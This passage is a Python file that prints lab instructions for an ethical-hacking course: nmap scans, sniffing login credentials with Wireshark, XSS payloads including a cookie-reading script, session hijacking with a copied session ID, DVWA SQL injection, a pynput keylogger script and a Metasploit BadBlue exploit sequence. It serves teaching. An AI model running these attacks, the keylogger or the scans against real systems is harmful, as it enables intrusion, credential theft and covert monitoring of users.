Windows system.
o Analyze the effects of ARP poisoning on network communication and
security.

Step 1: Type tracert command and type www.prestashop.com press “Enter”.


Ifconfig

Netstat

tracert www.prestashop.com



ping 91.240.109.42
ping 192.168.0.1
ping 203.192.253.1
ping 125.18.4.65



ifconfig/ipconfig
netstat
    """
        )

def NmapDesc():
    print(
    """
AIM : Using Nmap scanner to perform port scanning of various forms – ACK, SYN, FIN,
NULL, XMAS.
Port Scanning with NMap
 Use NMap to perform an ACK scan to determine if a port is filtered, unfiltered,
or open.
 Perform SYN, FIN, NULL, and XMAS scans to identify open ports and their
characteristics.
 Analyze the scan results to gather information about the target system's
network services.
    """
        )

def Nmap():
    print(
    """
Practical 4
AIM : Using Nmap scanner to perform port scanning of various forms – ACK, SYN, FIN,
NULL, XMAS.
Port Scanning with NMap
 Use NMap to perform an ACK scan to determine if a port is filtered, unfiltered,
or open.
 Perform SYN, FIN, NULL, and XMAS scans to identify open ports and their
characteristics.
 Analyze the scan results to gather information about the target system's
network services.

NOTE : Install Nmap for windows and install it. After that open cmd and type “nmap” to check
if it is installed properly. Now type the below commands.

(A) TYPE THE COMMANDS IN COMMAND PROMPT :
(i) ACK -sA (TCP ACK scan)
Command : nmap -sA -T4 scanme.nmap.org

(ii) SYN (Stealth) Scan (-sS)
Command : nmap -p22,113,139 scanme.nmap.org

(iii) FIN Scan (-sF)
Command : nmap -sF -T4 192.168.0.5

(iv) NULL Scan (-sN)
Command : nmap –sN –p 22 scanme.nmap.org

(v) XMAS Scan (-sX)
Command : nmap -sX -T4 scanme.nmap.org

(B) TYPE THE COMMANDS IN Nmap :
(i) ACK -sA (TCP ACK scan)
Command : nmap -sA -T4 scanme.nmap.org

(ii) SYN (Stealth) Scan (-sS)
Command : nmap -p22,113,139 scanme.nmap.org

(iii) FIN Scan (-sF)
Command : nmap -sF -T4 192.168.0.5

(iv) NULL Scan (-sN)
Command : nmap –sN –p 22 scanme.nmap.org

(v) XMAS Scan (-sX)
Command : nmap -sX -T4 scanme.nmap.org

nmap -sA -T4 scanme.nmap.org


nmap -p22,113,139 scanme.nmap.org


nmap -sF -T4 192.168.0.5


nmap -sN -p 22 scanme.nmap.org


nmap -sX -T4 scanme.nmap.org






In NMAP:
target = google.com


nmap -sA -T4 google.com

scanme.nmap.org
nmap -p 22,113,139 scanme.nmap.org


nmap -sF -T4 192.168.0.5


nmap -sN -p 22 scanme.nmap.org


nmap -sX -T4 scanme.nmap.org
    """
        )


def WiresharkDesc():
    print(
    """
Aim: - Use WireShark sniffer to capture network traffic and analyze.

Network Traffic Capture and DoS Attack with Wireshark and Nemesy
 Network Traffic Capture:
o Use Wireshark to capture network traffic on a specific network
interface.
o Analyze the captured packets to extract relevant information and
identify potential security issues.
 Denial of Service (DoS) Attack:
o Use Nemesy to launch a DoS attack against a target system or network.
o Observe the impact of the attack on the target's availability and
performance. 
    """
        )

def Wireshark():
    print(
    """
Practical 5
Aim: - Use WireShark sniffer to capture network traffic and analyze.

Network Traffic Capture and DoS Attack with Wireshark and Nemesy
 Network Traffic Capture:
o Use Wireshark to capture network traffic on a specific network
interface.
o Analyze the captured packets to extract relevant information and
identify potential security issues.
 Denial of Service (DoS) Attack:
o Use Nemesy to launch a DoS attack against a target system or network.
o Observe the impact of the attack on the target's availability and
performance. 

Wireshark v: 1.10.8

Step 1: Install and open WireShark.

Step 2: Go to Capture tab and select Interface option.

Step 3: In Capture interface, Select Local Area Connection and click on start. 

Step 4: The source, Destination and protocols of the packets in the LAN network are displayed. 

Step 5: Open a demo.testfire.net website in a new window. 

Step 6: Click on the SignIn option and login using Username and Password. 

Step 7: The wireshark tool will keep recording the packets. 


Step 8: Select filter as http to make the search easier and click on apply. 



Step 9: Now stop the tool to stop recording. Find the post methods for username and passwords and U will see the Username and Password that you used to log in. 
    """
        )


def XSSDesc():
    print(
    """
AIM: Simulate persistant Cross Site Scripting attack. Step 1: Open a demo.testfire.net website in a new window and write the given below script in the search
    """
        )

def XSS():
    print(
    """
Practical 6

AIM: Simulate persistant Cross Site Scripting attack. Step 1: Open a demo.testfire.net website in a new window and write the given below script in the search

Persistent Cross-Site Scripting Attack
 Set up a vulnerable web application that is susceptible to persistent XSS
attacks.
 Craft a malicious script to exploit the XSS vulnerability and execute arbitrary
code.
 Observe the consequences of the attack and understand the potential risks
associated with XSS vulnerabilities.

box of the website

Code:- <script>alert("XSS attack")</script>


Step 2: Click on the GO button and a popup box get displayed in the web browser window and it will contain
all the information written in the search box within the Script tag.
    """
        )


def FirefoxDesc():
    print(
    """
AIM: Session impersonation using Firefox and Tamper Data add-on
    """
        )


def Firefox():
    print(
    """
Practical 7
AIM: Session impersonation using Firefox and Tamper Data add-on

Session Impersonation with Firefox and Tamper Data
 Install and configure the Tamper Data add-on in Firefox.
 Intercept and modify HTTP requests to impersonate a user's session.
 Understand the impact of session impersonation and the importance of session
management.


Step 1: Download Waterfox Browser Portable from the link: http://bit.ly/RCWATERFOX


Step 2: Install and Open Waterfox Browser

Step 3: Download tamper data add-on from the link: http://bit.ly/RCTAMPER

Enter the add on in the browser by sideloading and selecting from the file downloaded location


Step 4: Open the Add-Ons window in the browser

Step 5: Drag the downloaded Tamper Data Add-On to the browser window (restart if asked)


Step 6: Open the Add-Ons window (if not already open) and search for cookie editor
Install Cookie-Editor 1.8.0


Step 7: Now open http://www.techpanda.org/


Step 8: Assume you know the id and password for the first time
admin@google.com
Password2010


Step 9: After you see the dashboard, open the cookie editor and copy the phpsessionid
(From CookieEditor)


Step 10: Also copy the dashboard URL.Now close the dashboard tab


Step 11: Now open the browser options/privacy/remove individual cookies and delete the cookie(s)


Step 12: Now open Tools -> Tamper Data menu and Click on Start Tamper



Step 13: Now directly open the dashboard URL:http://www.techpanda.org/dashboard.php



Step 14: On the popup, remove the tick of 'Continue Tampering?' and click on Submit
Now again directly open the dashboard URL:
http://www.techpanda.org/dashboard.php


Step 15: On the popup, 'Continue Tampering?' click on tamper, and paste the earlier copied PHPSessionID and
press Ok.On the popup, remove the tick of 'Continue Tampering?' and click on Submit


Step 16: You should see the logged in dashboard directly without logging in.
    """
        )


def SQLinject():
    print(
    """
DVWA
Aim:SQL Injection Attack
 Identify a web application vulnerable to SQL injection.
 Craft and execute SQL injection queries to exploit the vulnerability.
 Extract sensitive information or manipulate the database through the SQL
injection attack.
    """
        )

def DVWA():
    print(
    """
Practical 8

Aim:SQL Injection Attack
 Identify a web application vulnerable to SQL injection.
 Craft and execute SQL injection queries to exploit the vulnerability.
 Extract sensitive information or manipulate the database through the SQL
injection attack.




Download and install XAMPP


Start Apache and MySQL

If port 3306 is blocked

go to localhost/dashboard
netstat -ano | findstr :3306

Download DVWA file from github 
Extract and remove master name from folder and paste it in xampp's htdocs folder

Go to localhost/dashboard to check XAMPP

Go to localhost/DVWA

Go to htdocs/DVWA/config

in it rename config.inc.php.dist to config.inc.php

Go to htdocs/DVWA/config


Open config.inc.php
dvwa_database=dvwa
dvwa_password = p@ssw0rd

Open XAMPP control panel
Click on mysql admin button which will open localhost/phpmyadmin

Go to databases

Create database named 'dvwa' and click on "CREATE"(make sure to match the name with dbname in config.inc.php file)
Click on the database

Click on priviiges tab-> Add user account
Username = 'dvwa' (Same as the config file)
Password = 'p@ssw0rd' (Same as the config file)


Grant every access to that user and click on "Go"

Make sure that you are notified for the user creation



Now you can open localhost/DVWA/login.php (on clicking login without entering username and password would redirect you to localhost/DVWA/setup.php)

On login you should be redirected to the setup page localhost/DVWA/setup.php



Click on "Create/Reset Database"



On successful creation notification will be shown
Default credentials: admin / password.

Again go to localhost/DVWA/setup.php


Again open XAMPP control panel and click on APACHE's Config

Open apache's php.ini file


Search for allow_url_include and make it On from Off

Search for gd and remove ";" from beginning of extension=gd to enable gd


Save and restart APACHE server



Click on DVWA security or from localhost/DVWA/security.php
Change security level from impossible to low-> submit and confirm



Go to XSS(Reflected) enter name and click on submit to try

In it also try:
<script>alert('From DVWA')</script>




Click on SQL injection
user id 1=1, 1*, "a" or "=", 2, 3, etc
In user id 1 and click on submit





Click on XSS(Stored)

Give name:test1 and message:<script>alert("this is xss file")</script>

click on sign guestbook



Give name:test2 and message:<script>alert(document.cookie)</script>

click on sign guestbook
    """
        )


def KeylogDesc():
    print(
    """
Creating a Keylogger with Python
 Write a Python script that captures and logs keystrokes from a target system.
 Execute the keylogger script and observe the logged keystrokes.
 Understand the potential security risks associated with keyloggers and the
importance of protecting against them.
    """
        )

def Keylog():
    print(
    """
Practical 9

Creating a Keylogger with Python
 Write a Python script that captures and logs keystrokes from a target system.
 Execute the keylogger script and observe the logged keystrokes.
 Understand the potential security risks associated with keyloggers and the
importance of protecting against them.

Key Logger



from pynput.keyboard import Key, Listener
import logging

print("Vaibhav Patel \nTYCS\nRoll no - 95")
log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG,
                    format='%(asctime)s:%(message)s:')

def on_press(key):
    logging.info(f"Key {key} pressed")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

    """
        )



def MetasploitDesc():
    print(
    """
Exploiting with Metasploit (Kali Linux)
 Identify a vulnerable system and exploit it using Metasploit modules.
 Gain unauthorized access to the target system and execute commands or extract
information.
 Understand the ethical considerations and legal implications of using
Metasploit for penetration testing.
    """
        )

def Metasploit():
    print(
    """
Practical 10
Aim: Using Metasploit to exploit(Kali Linux)

Exploiting with Metasploit (Kali Linux)
 Identify a vulnerable system and exploit it using Metasploit modules.
 Gain unauthorized access to the target system and execute commands or extract
information.
 Understand the ethical considerations and legal implications of using
Metasploit for penetration testing.



Step1: Open BadBlue and set the port to 8000
Note: Open cmd type ipconfig and if you are getting error then set environment variable and change system variable path to:
C:\Windows\System32






Step2: Start BadBlue





Step 3: Go to kali Linux operating system on VMWare and open terminal




Step 4: Tyoe the command in terminal. First change the password, for that type password as sdsm. then type following commands:

a) serivce postgresql start
b) msfconsole
c) search badblue
d) use exploit/windows/http/badblue_passthru
e) set rhost 192.168.149.133
f) set rport 8000
g) run
    """
        )

def HelpDS():
    print(
    """
ExcelDesc
Excel
DataFrameProcDesc
DataFrameProc
WranglingDesc
Wrangling
HypothesisDesc
Hypothesis
AnovaDesc
Anova
RegressDesc
Regress
LogRegDesc
LogReg
KMeansDesc
KMeans
PCADesc
PCA
VisulaizeDesc
Visualize
    """
        )


def HelpCC():
    print(
    """
SimservDesc
Simserv
RestservDesc
Restserv
SoapservDesc
Soapserv
GoogleDesc
Google
KVMDesc
KVM
MTOMDesc
MTOM
FossIaasDesc
FossIaas
FossPaasDesc
FossPaas
AWSDesc
AWS
OpenstackDesc
Openstack
    """
        )

def HelpWSN():
    print(
    """
AdhocDesc
Adhoc
RoutableDesc
Routable
ManetDesc
Manet
WSNSimDesc
WSNSim
MacprotDesc
Macprot
MobsimDesc
Mobsim
MobtowDesc
Mobtow
    """
        )

def HelpEH():
    print(
    """
WhoisDesc
Whois
CrytabelDesc
Crytabel
LianalyzeDesc
Lianalyze
NmapDesc
Nmap
WiresharkDesc
Wireshark
XSSDesc
XSS
FirefoxDesc
Firefox
SQLinject
DVWA
KeylogDesc
Keylog
MetasploitDesc
Metasploit
    """
        )

def HelpMe():
    print(
    """
HelpDS
HelpCC
HelpWSN
HelpEH
    """
        )
